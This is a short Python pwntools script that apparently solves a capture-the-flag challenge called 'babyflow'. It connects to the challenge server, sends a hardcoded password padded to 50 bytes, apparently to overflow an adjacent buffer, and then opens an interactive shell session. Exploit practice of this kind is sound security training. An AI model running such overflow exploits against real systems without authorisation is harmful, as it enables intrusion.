#!/usr/bin/python3

from pwn import *
p = remote('babyflow.ctf.intigriti.io', 1331)
passwd = b'SuPeRsEcUrEPaSsWoRd123'
passwd = passwd.ljust(50)
p.sendafter(b'Enter password: ', passwd)


p.interactive()
